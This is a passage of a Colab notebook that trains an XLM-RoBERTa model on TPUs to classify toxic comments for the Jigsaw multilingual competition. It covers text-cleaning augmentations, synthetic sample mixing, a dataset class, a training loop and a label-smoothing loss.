        "    def apply(self, data, **params):\n",
        "        text, lang = data\n",
        "        sentences = self.get_sentences(text, lang)\n",
        "        random.shuffle(sentences)\n",
        "\n",
        "        return ' '.join(sentences), lang\n",
        "\n",
        "class ExcludeDuplicateSentencesTransform(NLPTransform):\n",
        "    \"\"\" Exclude equal sentences \"\"\"\n",
        "    def __init__(self, always_apply=False, p=0.5):\n",
        "        super(ExcludeDuplicateSentencesTransform, self).__init__(always_apply, p)\n",
        "\n",
        "    def apply(self, data, **params):\n",
        "        text, lang = data\n",
        "        sentences = []\n",
        "\n",
        "        for sentence in self.get_sentences(text, lang):\n",
        "            sentence = sentence.strip()\n",
        "\n",
        "            if sentence not in sentences:\n",
        "                sentences.append(sentence)\n",
        "\n",
        "        return ' '.join(sentences), lang\n",
        "\n",
        "class ExcludeNumbersTransform(NLPTransform):\n",
        "    \"\"\" exclude any numbers \"\"\"\n",
        "    def __init__(self, always_apply=False, p=0.5):\n",
        "        super(ExcludeNumbersTransform, self).__init__(always_apply, p)\n",
        "\n",
        "    def apply(self, data, **params):\n",
        "        text, lang = data\n",
        "        text = re.sub(r'[0-9]', '', text)\n",
        "        text = re.sub(r'\\s+', ' ', text)\n",
        "\n",
        "        return text, lang\n",
        "\n",
        "class ExcludeHashtagsTransform(NLPTransform):\n",
        "    \"\"\" Exclude any hashtags with # \"\"\"\n",
        "    def __init__(self, always_apply=False, p=0.5):\n",
        "        super(ExcludeHashtagsTransform, self).__init__(always_apply, p)\n",
        "\n",
        "    def apply(self, data, **params):\n",
        "        text, lang = data\n",
        "        text = re.sub(r'#[\\S]+\\b', '', text)\n",
        "        text = re.sub(r'\\s+', ' ', text)\n",
        "\n",
        "        return text, lang\n",
        "\n",
        "class ExcludeUsersMentionedTransform(NLPTransform):\n",
        "    \"\"\" Exclude @users \"\"\"\n",
        "    def __init__(self, always_apply=False, p=0.5):\n",
        "        super(ExcludeUsersMentionedTransform, self).__init__(always_apply, p)\n",
        "\n",
        "    def apply(self, data, **params):\n",
        "        text, lang = data\n",
        "        text = re.sub(r'@[\\S]+\\b', '', text)\n",
        "        text = re.sub(r'\\s+', ' ', text)\n",
        "\n",
        "        return text, lang\n",
        "\n",
        "class ExcludeUrlsTransform(NLPTransform):\n",
        "    \"\"\" Exclude urls \"\"\"\n",
        "    def __init__(self, always_apply=False, p=0.5):\n",
        "        super(ExcludeUrlsTransform, self).__init__(always_apply, p)\n",
        "\n",
        "    def apply(self, data, **params):\n",
        "        text, lang = data\n",
        "        text = re.sub(r'https?\\S+', '', text)\n",
        "        text = re.sub(r'\\s+', ' ', text)\n",
        "\n",
        "        return text, lang"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab_type": "code",
        "id": "uFB3UeyAsYCp",
        "colab": {}
      },
      "source": [
        "class SynthesicOpenSubtitlesTransform(NLPTransform):\n",
        "    def __init__(self, always_apply=False, p=0.5):\n",
        "        super(SynthesicOpenSubtitlesTransform, self).__init__(always_apply, p)\n",
        "        df = pd.read_csv(f'{ROOT_PATH}/input/open-subtitles-toxic-pseudo-labeling/open-subtitles-synthesic.csv', index_col='id')[['comment_text', 'toxic', 'lang']]\n",
        "        df = df[~df['comment_text'].isna()]\n",
        "        df['comment_text'] = df.parallel_apply(lambda x: clean_text(x['comment_text'], x['lang']), axis=1)\n",
        "        df = df.drop_duplicates(subset='comment_text')\n",
        "        df['toxic'] = df['toxic'].round().astype(np.int)\n",
        "\n",
        "        self.synthesic_toxic = df[df['toxic'] == 1].comment_text.values\n",
        "        self.synthesic_non_toxic = df[df['toxic'] == 0].comment_text.values\n",
        "\n",
        "        del df\n",
        "        gc.collect();\n",
        "\n",
        "    def generate_synthesic_sample(self, text, toxic):\n",
        "        texts = [text]\n",
        "\n",
        "        if toxic == 0:\n",
        "            for i in range(random.randint(1,5)):\n",
        "                texts.append(random.choice(self.synthesic_non_toxic))\n",
        "        else:\n",
        "            for i in range(random.randint(0,2)):\n",
        "                texts.append(random.choice(self.synthesic_non_toxic))\n",
        "\n",
        "            for i in range(random.randint(1,3)):\n",
        "                texts.append(random.choice(self.synthesic_toxic))\n",
        "        random.shuffle(texts)\n",
        "\n",
        "        return ' '.join(texts)\n",
        "\n",
        "    def apply(self, data, **params):\n",
        "        text, toxic = data\n",
        "        text = self.generate_synthesic_sample(text, toxic)\n",
        "\n",
        "        return text, toxic"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab_type": "code",
        "id": "K5BdJ9HWvnLW",
        "colab": {}
      },
      "source": [
        "def get_train_transforms():\n",
        "    return albumentations.Compose([\n",
        "        ExcludeUsersMentionedTransform(p=0.95),\n",
        "        ExcludeUrlsTransform(p=0.95),\n",
        "        ExcludeNumbersTransform(p=0.95),\n",
        "        ExcludeHashtagsTransform(p=0.95),\n",
        "        ExcludeDuplicateSentencesTransform(p=0.95),\n",
        "    ], p=1.0)\n",
        "\n",
        "def get_synthesic_transforms():\n",
        "    return SynthesicOpenSubtitlesTransform(p=0.5)\n",
        "\n",
        "\n",
        "train_transforms = get_train_transforms();\n",
        "synthesic_transforms = get_synthesic_transforms()\n",
        "tokenizer = XLMRobertaTokenizer.from_pretrained(BACKBONE_PATH)\n",
        "shuffle_transforms = ShuffleSentencesTransform(always_apply=True)"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab_type": "code",
        "id": "qFp80AuJu9Ii",
        "colab": {}
      },
      "source": [
        "def onehot(size, target, aux=None):\n",
        "    if aux is not None:\n",
        "        vec = np.zeros(size+len(aux), dtype=np.float32)\n",
        "        vec[target] = 1.\n",
        "        vec[2:] = aux\n",
        "        vec = torch.tensor(vec, dtype=torch.float32)\n",
        "    else:\n",
        "        vec = torch.zeros(size, dtype=torch.float32)\n",
        "        vec[target] = 1.\n",
        "\n",
        "    return vec\n",
        "\n",
        "from kaggle_runner import may_debug\n",
        "\n",
        "class DatasetRetriever(Dataset):\n",
        "    def __init__(self, labels_or_ids, comment_texts, langs,\n",
        "                 severe_toxic=None, obscene=None, threat=None, insult=None, identity_hate=None,\n",
        "                 use_train_transforms=False, test=False, use_aux=True):\n",
        "        self.test = test\n",
        "        self.labels_or_ids = labels_or_ids\n",
        "        self.comment_texts = comment_texts\n",
        "        self.langs = langs\n",
        "        self.severe_toxic = severe_toxic\n",
        "        self.obscene = obscene\n",
        "        self.threat = threat\n",
        "        self.insult = insult\n",
        "        self.identity_hate = identity_hate\n",
        "        self.use_train_transforms = use_train_transforms\n",
        "        self.aux = None\n",
        "\n",
        "        if use_aux:\n",
        "            self.aux = [self.severe_toxic, self.obscene, self.threat, self.insult, self.identity_hate]\n",
        "\n",
        "    def get_tokens(self, text):\n",
        "        encoded = tokenizer.encode_plus(\n",
        "            text,\n",
        "            add_special_tokens=True,\n",
        "            max_length=MAX_LENGTH,\n",
        "            pad_to_max_length=True\n",
        "        )\n",
        "\n",
        "        return encoded['input_ids'], encoded['attention_mask']\n",
        "\n",
        "    def __len__(self):\n",
        "        return self.comment_texts.shape[0]\n",
        "\n",
        "    def __getitem__(self, idx):\n",
        "        text = self.comment_texts[idx]\n",
        "        lang = self.langs[idx]\n",
        "\n",
        "        if self.severe_toxic is None:\n",
        "            aux = [0., 0., 0., 0., 0.]\n",
        "        else:\n",
        "            aux = [self.severe_toxic[idx], self.obscene[idx], self.threat[idx], self.insult[idx], self.identity_hate[idx]]\n",
        "\n",
        "        if self.test is False:\n",
        "            label = self.labels_or_ids[idx]\n",
        "            target = onehot(2, label, aux=aux)\n",
        "\n",
        "        if self.use_train_transforms:\n",
        "            text, _ = train_transforms(data=(text, lang))['data']\n",
        "            tokens, attention_mask = self.get_tokens(str(text))\n",
        "            token_length = sum(attention_mask)\n",
        "\n",
        "            if token_length > 0.8*MAX_LENGTH:\n",
        "                text, _ = shuffle_transforms(data=(text, lang))['data']\n",
        "            elif token_length < 60:\n",
        "                text, _ = synthesic_transforms(data=(text, label))['data']\n",
        "            else:\n",
        "                tokens, attention_mask = torch.tensor(tokens), torch.tensor(attention_mask)\n",
        "\n",
        "                return target, tokens, attention_mask\n",
        "\n",
        "        tokens, attention_mask = self.get_tokens(str(text))\n",
        "        tokens, attention_mask = torch.tensor(tokens), torch.tensor(attention_mask)\n",
        "\n",
        "        if self.test is False:\n",
        "            return target, tokens, attention_mask\n",
        "\n",
        "        return self.labels_or_ids[idx], tokens, attention_mask\n",
        "\n",
        "    def get_labels(self):\n",
        "        return list(np.char.add(self.labels_or_ids.astype(str), self.langs))"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab_type": "code",
        "id": "3DVkkUVMu9Ka",
        "colab": {}
      },
      "source": [
        "%%time\n",
        "\n",
        "df_train = pd.read_csv(f'{ROOT_PATH}/input/jigsaw-toxicity-train-data-with-aux/train_data.csv')\n",
        "\n",
        "\n",
        "train_dataset = DatasetRetriever(\n",
        "    labels_or_ids=df_train['toxic'].values,\n",
        "    comment_texts=df_train['comment_text'].values,\n",
        "    langs=df_train['lang'].values,\n",
        "    severe_toxic=df_train['severe_toxic'].values,\n",
        "    obscene=df_train['obscene'].values,\n",
        "    threat=df_train['threat'].values,\n",
        "    insult=df_train['insult'].values,\n",
        "    identity_hate=df_train['identity_hate'].values,\n",
        "    use_train_transforms=True,\n",
        ")\n",
        "\n",
        "del df_train\n",
        "gc.collect();\n",
        "\n",
        "for targets, tokens, attention_masks in train_dataset:\n",
        "    break\n",
        "\n",
        "print(targets)\n",
        "print(tokens.shape)\n",
        "print(attention_masks.shape)"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab_type": "code",
        "id": "PlcGdUdSYewm",
        "colab": {}
      },
      "source": [
        "np.unique(train_dataset.get_labels())"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab_type": "code",
        "id": "bW4dEWaYu9NF",
        "colab": {}
      },
      "source": [
        "df_val = pd.read_csv(f'{ROOT_PATH}/input/jigsaw-multilingual-toxic-comment-classification/validation.csv', index_col='id')\n",
        "\n",
        "validation_tune_dataset = DatasetRetriever(\n",
        "    labels_or_ids=df_val['toxic'].values,\n",
        "    comment_texts=df_val['comment_text'].values,\n",
        "    langs=df_val['lang'].values,\n",
        "    use_train_transforms=True,\n",
        ")\n",
        "\n",
        "df_val['comment_text'] = df_val.parallel_apply(lambda x: clean_text(x['comment_text'], x['lang']), axis=1)\n",
        "\n",
        "validation_dataset = DatasetRetriever(\n",
        "    labels_or_ids=df_val['toxic'].values,\n",
        "    comment_texts=df_val['comment_text'].values,\n",
        "    langs=df_val['lang'].values,\n",
        "    use_train_transforms=False,\n",
        ")\n",
        "\n",
        "del df_val\n",
        "gc.collect();\n",
        "\n",
        "for targets, tokens, attention_masks in validation_dataset:\n",
        "    break\n",
        "\n",
        "print(targets)\n",
        "print(tokens.shape)\n",
        "print(attention_masks.shape)"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab_type": "code",
        "id": "zNdADp28v3av",
        "colab": {}
      },
      "source": [
        "df_test = pd.read_csv(f'{ROOT_PATH}/input/jigsaw-multilingual-toxic-comment-classification/test.csv', index_col='id')\n",
        "df_test['comment_text'] = df_test.parallel_apply(lambda x: clean_text(x['content'], x['lang']), axis=1)\n",
        "\n",
        "test_dataset = DatasetRetriever(\n",
        "    labels_or_ids=df_test.index.values,\n",
        "    comment_texts=df_test['comment_text'].values,\n",
        "    langs=df_test['lang'].values,\n",
        "    use_train_transforms=False,\n",
        "    test=True\n",
        ")\n",
        "\n",
        "del df_test\n",
        "gc.collect();\n",
        "\n",
        "for ids, tokens, attention_masks in test_dataset:\n",
        "    break\n",
        "\n",
        "print(ids)\n",
        "print(tokens.shape)\n",
        "print(attention_masks.shape)"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab_type": "code",
        "id": "I2bN_NySwU6c",
        "colab": {}
      },
      "source": [
        "class RocAucMeter(object):\n",
        "    def __init__(self):\n",
        "        self.reset()\n",
        "\n",
        "    def reset(self):\n",
        "        self.y_true = np.array([0,1])\n",
        "        self.y_pred = np.array([0.5,0.5])\n",
        "        self.score = 0\n",
        "\n",
        "    def update(self, y_true, y_pred):\n",
        "        y_true = y_true.cpu().numpy().argmax(axis=1)\n",
        "        y_pred = nn.functional.softmax(y_pred, dim=1).data.cpu().numpy()[:,1]\n",
        "        self.y_true = np.hstack((self.y_true, y_true))\n",
        "        self.y_pred = np.hstack((self.y_pred, y_pred))\n",
        "        self.score = sklearn.metrics.roc_auc_score(self.y_true, self.y_pred, labels=np.array([0, 1]))\n",
        "\n",
        "    @property\n",
        "    def avg(self):\n",
        "        return self.score\n",
        "\n",
        "class AverageMeter(object):\n",
        "    \"\"\"Computes and stores the average and current value\"\"\"\n",
        "    def __init__(self):\n",
        "        self.reset()\n",
        "\n",
        "    def reset(self):\n",
        "        self.val = 0\n",
        "        self.avg = 0\n",
        "        self.sum = 0\n",
        "        self.count = 0\n",
        "\n",
        "    def update(self, val, n=1):\n",
        "        self.val = val\n",
        "        self.sum += val * n\n",
        "        self.count += n\n",
        "        self.avg = self.sum / self.count"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab_type": "code",
        "id": "Ow13PTlFwbiH",
        "colab": {}
      },
      "source": [
        "import warnings\n",
        "\n",
        "warnings.filterwarnings(\"ignore\")\n",
        "\n",
        "import torch_xla\n",
        "import torch_xla.core.xla_model as xm\n",
        "import torch_xla.distributed.parallel_loader as pl\n",
        "import torch_xla.distributed.xla_multiprocessing as xmp\n",
        "\n",
        "from catalyst.data.sampler import DistributedSamplerWrapper, BalanceClassSampler\n",
        "\n",
        "class TPUFitter:\n",
        "\n",
        "    def __init__(self, model, device, config):\n",
        "        if not os.path.exists('node_submissions'):\n",
        "            os.makedirs('node_submissions')\n",
        "\n",
        "        self.config = config\n",
        "        self.epoch = 0\n",
        "        self.log_path = 'log.txt'\n",
        "\n",
        "        self.model = model\n",
        "        self.device = device\n",
        "\n",
        "        param_optimizer = list(self.model.named_parameters())\n",
        "        no_decay = ['bias', 'LayerNorm.bias', 'LayerNorm.weight']\n",
        "        optimizer_grouped_parameters = [\n",
        "            {'params': [p for n, p in param_optimizer if not any(nd in n for nd in no_decay)], 'weight_decay': 0.001},\n",
        "            {'params': [p for n, p in param_optimizer if any(nd in n for nd in no_decay)], 'weight_decay': 0.0}\n",
        "        ]\n",
        "\n",
        "        self.optimizer = AdamW(optimizer_grouped_parameters, lr=config.lr*xm.xrt_world_size())\n",
        "        self.scheduler = config.SchedulerClass(self.optimizer, **config.scheduler_params)\n",
        "\n",
        "        self.criterion = config.criterion\n",
        "        xm.master_print(f'Fitter prepared. Device is {self.device}')\n",
        "\n",
        "    def fit(self, train_loader, validation_loader):\n",
        "        for e in range(self.config.n_epochs):\n",
        "            if self.config.verbose:\n",
        "                lr = self.optimizer.param_groups[0]['lr']\n",
        "                timestamp = datetime.utcnow().isoformat()\n",
        "                self.log(f'\\n{timestamp}\\nLR: {lr}')\n",
        "\n",
        "            t = time.time()\n",
        "            para_loader = pl.ParallelLoader(train_loader, [self.device])\n",
        "            losses, final_scores = self.train_one_epoch(para_loader.per_device_loader(self.device))\n",
        "\n",
        "            self.log(f'[RESULT]: Train. Epoch: {self.epoch}, loss: {losses.avg:.5f}, final_score: {final_scores.avg:.5f}, time: {(time.time() - t):.5f}')\n",
        "\n",
        "            t = time.time()\n",
        "            para_loader = pl.ParallelLoader(validation_loader, [self.device])\n",
        "            losses, final_scores = self.validation(para_loader.per_device_loader(self.device))\n",
        "\n",
        "            self.log(f'[RESULT]: Validation. Epoch: {self.epoch}, loss: {losses.avg:.5f}, final_score: {final_scores.avg:.5f}, time: {(time.time() - t):.5f}')\n",
        "\n",
        "            if self.config.validation_scheduler:\n",
        "                self.scheduler.step(metrics=final_scores.avg)\n",
        "\n",
        "            self.epoch += 1\n",
        "\n",
        "    def run_tuning_and_inference(self, test_loader, validation_tune_loader):\n",
        "        for e in range(2):\n",
        "            self.optimizer.param_groups[0]['lr'] = self.config.lr*xm.xrt_world_size()\n",
        "            para_loader = pl.ParallelLoader(validation_tune_loader, [self.device])\n",
        "            losses, final_scores = self.train_one_epoch(para_loader.per_device_loader(self.device))\n",
        "            para_loader = pl.ParallelLoader(test_loader, [self.device])\n",
        "            self.run_inference(para_loader.per_device_loader(self.device))\n",
        "\n",
        "    def validation(self, val_loader):\n",
        "        self.model.eval()\n",
        "        losses = AverageMeter()\n",
        "        final_scores = RocAucMeter()\n",
        "\n",
        "        t = time.time()\n",
        "\n",
        "        for step, (targets, inputs, attention_masks) in enumerate(val_loader):\n",
        "            if self.config.verbose:\n",
        "                if step % self.config.verbose_step == 0:\n",
        "                    xm.master_print(\n",
        "                        f'Valid Step {step}, loss: ' + \\\n",
        "                        f'{losses.avg:.5f}, final_score: {final_scores.avg:.5f}, ' + \\\n",
        "                        f'time: {(time.time() - t):.5f}'\n",
        "                    )\n",
        "            with torch.no_grad():\n",
        "                inputs = inputs.to(self.device, dtype=torch.long)\n",
        "                attention_masks = attention_masks.to(self.device, dtype=torch.long)\n",
        "                targets = targets.to(self.device, dtype=torch.float)\n",
        "\n",
        "                outputs = self.model(inputs, attention_masks)\n",
        "                loss = self.criterion(outputs, targets)\n",
        "\n",
        "                batch_size = inputs.size(0)\n",
        "\n",
        "                final_scores.update(targets, outputs)\n",
        "                losses.update(loss.detach().item(), batch_size)\n",
        "\n",
        "        return losses, final_scores\n",
        "\n",
        "    def train_one_epoch(self, train_loader):\n",
        "        self.model.train()\n",
        "\n",
        "        losses = AverageMeter()\n",
        "        final_scores = RocAucMeter()\n",
        "        t = time.time()\n",
        "\n",
        "        for step, (targets, inputs, attention_masks) in enumerate(train_loader):\n",
        "            if self.config.verbose:\n",
        "                if step % self.config.verbose_step == 0:\n",
        "                    self.log(\n",
        "                        f'Train Step {step}, loss: ' + \\\n",
        "                        f'{losses.avg:.5f}, final_score: {final_scores.avg:.5f}, ' + \\\n",
        "                        f'time: {(time.time() - t):.5f}'\n",
        "                    )\n",
        "\n",
        "            inputs = inputs.to(self.device, dtype=torch.long)\n",
        "            attention_masks = attention_masks.to(self.device, dtype=torch.long)\n",
        "            targets = targets.to(self.device, dtype=torch.float)\n",
        "\n",
        "            self.optimizer.zero_grad()\n",
        "\n",
        "            outputs = self.model(inputs, attention_masks)\n",
        "            loss = self.criterion(outputs, targets)\n",
        "\n",
        "            batch_size = inputs.size(0)\n",
        "\n",
        "            final_scores.update(targets, outputs)\n",
        "\n",
        "            losses.update(loss.detach().item(), batch_size)\n",
        "\n",
        "            loss.backward()\n",
        "            xm.optimizer_step(self.optimizer)\n",
        "\n",
        "            if self.config.step_scheduler:\n",
        "                self.scheduler.step()\n",
        "\n",
        "        self.model.eval()\n",
        "        self.save('last-checkpoint.bin')\n",
        "\n",
        "        return losses, final_scores\n",
        "\n",
        "    def run_inference(self, test_loader):\n",
        "        self.model.eval()\n",
        "        result = {'id': [], 'toxic': []}\n",
        "        t = time.time()\n",
        "\n",
        "        for step, (ids, inputs, attention_masks) in enumerate(test_loader):\n",
        "            if self.config.verbose:\n",
        "                if step % self.config.verbose_step == 0:\n",
        "                    xm.master_print(f'Prediction Step {step}, time: {(time.time() - t):.5f}')\n",
        "\n",
        "            with torch.no_grad():\n",
        "                inputs = inputs.to(self.device, dtype=torch.long)\n",
        "                attention_masks = attention_masks.to(self.device, dtype=torch.long)\n",
        "                outputs = self.model(inputs, attention_masks)\n",
        "                toxics = nn.functional.softmax(outputs, dim=1).data.cpu().numpy()[:,1]\n",
        "\n",
        "            result['id'].extend(ids.cpu().numpy())\n",
        "            result['toxic'].extend(toxics)\n",
        "\n",
        "        result = pd.DataFrame(result)\n",
        "        node_count = len(glob('node_submissions/*.csv'))\n",
        "        result.to_csv(f'node_submissions/submission_{node_count}_{datetime.utcnow().microsecond}_{random.random()}.csv', index=False)\n",
        "\n",
        "    def save(self, path):\n",
        "        xm.save(self.model.state_dict(), path)\n",
        "\n",
        "    def log(self, message):\n",
        "        if self.config.verbose:\n",
        "            xm.master_print(message)\n",
        "        with open(self.log_path, 'a+') as logger:\n",
        "            xm.master_print(f'{message}', logger)"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab_type": "code",
        "id": "kO9ovGhdwb7W",
        "colab": {}
      },
      "source": [
        "from transformers import XLMRobertaModel\n",
        "\n",
        "class ToxicSimpleNNModel(nn.Module):\n",
        "\n",
        "    def __init__(self, use_aux=True):\n",
        "        super(ToxicSimpleNNModel, self).__init__()\n",
        "        self.backbone = XLMRobertaModel.from_pretrained(BACKBONE_PATH)\n",
        "        self.dropout = nn.Dropout(0.3)\n",
        "        aux_len = 0\n",
        "\n",
        "        if use_aux:\n",
        "            aux_len = 5\n",
        "        self.linear = nn.Linear(\n",
        "            in_features=self.backbone.pooler.dense.out_features*2,\n",
        "            out_features=2+aux_len,\n",
        "        )\n",
        "\n",
        "    def forward(self, input_ids, attention_masks):\n",
        "        bs, seq_length = input_ids.shape\n",
        "        seq_x, _ = self.backbone(input_ids=input_ids, attention_mask=attention_masks)\n",
        "        apool = torch.mean(seq_x, 1)\n",
        "        mpool, _ = torch.max(seq_x, 1)\n",
        "        x = torch.cat((apool, mpool), 1)\n",
        "        x = self.dropout(x)\n",
        "\n",
        "        return self.linear(x)\n"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab_type": "code",
        "id": "arcC5IeYxUbr",
        "colab": {}
      },
      "source": [
        "from kaggle_runner import may_debug\n",
        "\n",
        "\n",
        "class LabelSmoothing(nn.Module):\n",
        "    \"\"\"https://github.com/pytorch/pytorch/issues/7455#issuecomment-513062631\"\"\"\n",
        "\n",
        "    def __init__(self, smoothing = 0.1, dim=-1):\n",
        "        super(LabelSmoothing, self).__init__()\n",
        "        self.cls = 2\n",
        "        self.confidence = 1.0 - smoothing\n",
        "        self.smoothing = smoothing\n",
        "        self.dim = dim\n",
        "\n",
        "    def forward(self, x, target):\n",
        "        may_debug()\n",
        "        if self.training:\n",
        "            pred = x[:,:2].log_softmax(dim=self.dim)\n",
        "            aux=x[:, 2:]\n",
        "\n",
        "            toxic_target = target[:,:2]\n",
        "            aux_target = target[:, 2:]\n",
        "            with torch.no_grad():\n",
        "                # true_dist = pred.data.clone()\n",
        "                true_dist = torch.zeros_like(pred)\n",
        "                true_dist.fill_(self.smoothing) # hardcode for binary classification\n",
        "                true_dist += (1-self.smoothing*2)*toxic_target\n",
        "                # true_dist.scatter_(1, toxic_target.data.unsqueeze(1), self.confidence) # only for 0 1 label, put confidence to related place\n",
        "\n",
        "                # for 0-1, 0 -> 0.1, 1->0.9.(if 1), if zero. 0->0.9, 1->0.1\n",
        "                smooth_aux = torch.zeros_like(aux_target)\n",
        "                smooth_aux.fill_(self.smoothing) # only for binary cross entropy\n",
        "                smooth_aux += (1-self.smoothing*2)*aux_target  # only for binary cross entropy, so for lable, it is (1-smooth)*\n",
        "\n",
        "            aux_loss = torch.nn.functional.binary_cross_entropy_with_logits(aux, smooth_aux)\n",
        "\n",
        "            return torch.mean(torch.sum(-true_dist * pred, dim=self.dim)) + aux_loss/5\n",
        "        else:\n",
        "            return torch.nn.functional.binary_cross_entropy_with_logits(x[:,:2], target[:,:2])"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab_type": "code",
        "id": "dZmTJ4XQwb9y",
        "colab": {}
      },
      "source": [
        "class TrainGlobalConfig:\n",
        "    \"\"\" Global Config for this notebook \"\"\"\n",
        "    num_workers = 0  #    loaders\n",
        "    batch_size = 16  # bs\n",
        "    n_epochs = 2  #    \n",
        "    lr = 0.5 * 1e-5 #  learning rate (     TPU   - )\n",
        "    fold_number = 0  #    \n",
        "\n",
        "    # -------------------\n",
        "    verbose = True  #  \n",
        "    verbose_step = 50  #     \n",
        "    # -------------------\n",
        "\n",
        "    # --------------------\n",
        "    step_scheduler = False  #  scheduler.step   optimizer.step\n",
        "    validation_scheduler = True  #  scheduler.step   loss (  )\n",
        "    SchedulerClass = torch.optim.lr_scheduler.ReduceLROnPlateau\n",
        "    scheduler_params = dict(\n",
        "        mode='max',\n",
        "        factor=0.7,\n",
        "        patience=0,\n",
        "        verbose=False,\n",
        "        threshold=0.0001,\n",
        "        threshold_mode='abs',\n",
        "        cooldown=0,\n",
        "        min_lr=1e-8,\n",
        "        eps=1e-08\n",
        "    )\n",
        "    # --------------------\n",
        "\n",
        "    # -------------------\n",
        "    criterion = LabelSmoothing()\n",
        "    # -------------------"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab_type": "code",
        "id": "_79qoceFwcAF",
        "colab": {}
      },
      "source": [
        "net = ToxicSimpleNNModel()"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab_type": "code",
        "id": "InecI_CbxXA_",
        "colab": {}
      },
      "source": [
        "def _test_model_fn():\n",
        "    from kaggle_runner import logger\n",
        "    device = torch.device('cpu')\n",
        "    net.to(device)\n",
        "\n",
        "    #test_sampler = torch.utils.data.distributed.DistributedSampler(\n",
        "    #    test_dataset,\n",
        "    #    num_replicas=xm.xrt_world_size(),\n",
        "    #    rank=xm.get_ordinal(),\n",
        "    #    shuffle=False\n",
        "    #)\n",
        "    test_loader = torch.utils.data.DataLoader(\n",
        "        test_dataset,\n",
        "        batch_size=TrainGlobalConfig.batch_size,\n",
        "    #    sampler=test_sampler,\n",
        "        pin_memory=False,\n",
        "        drop_last=False,\n",
        "        num_workers=TrainGlobalConfig.num_workers\n",
        "    )\n",
        "\n",
        "    def validation(model, device, config, val_loader, criterion):\n",
        "        model.eval()\n",
        "        losses = AverageMeter()\n",
        "        final_scores = RocAucMeter()\n",
        "\n",
        "        t = time.time()\n",
        "\n",
        "        for step, (targets, inputs, attention_masks) in enumerate(val_loader):\n",
        "            if config.verbose:\n",
        "                if step % config.verbose_step == 0:\n",
        "                    logger.info(\n",
        "                        f'Valid Step {step}, loss: ' + \\\n",
        "                        f'{losses.avg:.5f}, final_score: {final_scores.avg:.5f}, ' + \\\n",
        "                        f'time: {(time.time() - t):.5f}'\n",
        "                    )\n",
        "            with torch.no_grad():\n",
        "                inputs = inputs.to(device, dtype=torch.long)\n",
        "                attention_masks = attention_masks.to(device, dtype=torch.long)\n",
        "                targets = targets.to(device, dtype=torch.float)\n",
        "\n",
        "                outputs = model(inputs, attention_masks)\n",
        "                loss = criterion(outputs, targets)\n",
        "\n",
        "                batch_size = inputs.size(0)\n",
        "\n",
        "                final_scores.update(targets, outputs)\n",
        "                losses.update(loss.detach().item(), batch_size)\n",
        "\n",
        "    def run_inference(model, device, config, test_loader):\n",
        "        model.eval()\n",
        "        result = {'id': [], 'toxic': []}\n",
        "        t = time.time()\n",
        "\n",
        "        for step, (ids, inputs, attention_masks) in enumerate(test_loader):\n",
        "            if config.verbose:\n",
        "                if step % config.verbose_step == 0:\n",
        "                    logger.info(f'Prediction Step {step}, time: {(time.time() - t):.5f}')\n",
        "\n",
        "            with torch.no_grad():\n",
        "                inputs = inputs.to(device, dtype=torch.long)\n",
        "                attention_masks = attention_masks.to(device, dtype=torch.long)\n",
        "                outputs = model(inputs, attention_masks)\n",
        "                toxics = nn.functional.softmax(outputs, dim=1).data.cpu().numpy()[:,1]\n",
        "\n",
        "            result['id'].extend(ids.cpu().numpy())\n",
        "            result['toxic'].extend(toxics)\n",
        "    #validation_sampler = torch.utils.data.distributed.DistributedSampler(\n",
        "    #    validation_dataset,\n",
        "    #    num_replicas=xm.xrt_world_size(),\n",
        "    #    rank=xm.get_ordinal(),\n",
        "    #    shuffle=False\n",
        "    #)\n",
        "    validation_loader = torch.utils.data.DataLoader(\n",
        "        validation_dataset,\n",
        "        batch_size=TrainGlobalConfig.batch_size,\n",
        "    #    sampler=validation_sampler,\n",
        "        pin_memory=False,\n",
        "        drop_last=False,\n",
        "        num_workers=TrainGlobalConfig.num_workers\n",
        "    )\n",
        "\n",
        "    losses, final_scores = validation(net, device, TrainGlobalConfig, validation_loader, TrainGlobalConfig.criterion)\n",
        "    logger.info(f\"Val results: losses={losses}, final_scores={final_scores}\")"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab_type": "code",
        "id": "INecI_CbxXA_",
        "colab": {}
      },
      "source": [
        "def _mp_fn(rank, flags):\n",
        "    device = xm.xla_device()\n",
        "    net.to(device)\n",
        "\n",
        "    train_sampler = DistributedSamplerWrapper(\n",
        "        sampler=BalanceClassSampler(labels=train_dataset.get_labels(), mode=\"downsampling\"),\n",
        "        num_replicas=xm.xrt_world_size(),\n",
        "        rank=xm.get_ordinal(),\n",
        "        shuffle=True\n",
        "    )\n",
        "    train_loader = torch.utils.data.DataLoader(\n",
        "        train_dataset,\n",
        "        batch_size=TrainGlobalConfig.batch_size,\n",
        "        sampler=train_sampler,\n",
        "        pin_memory=False,\n",
        "        drop_last=True,\n",
        "        num_workers=TrainGlobalConfig.num_workers,\n",
        "    )\n",
        "    validation_sampler = torch.utils.data.distributed.DistributedSampler(\n",
        "        validation_dataset,\n",
        "        num_replicas=xm.xrt_world_size(),\n",
        "        rank=xm.get_ordinal(),\n",
        "        shuffle=False\n",
        "    )\n",
        "    validation_loader = torch.utils.data.DataLoader(\n",
        "        validation_dataset,\n",
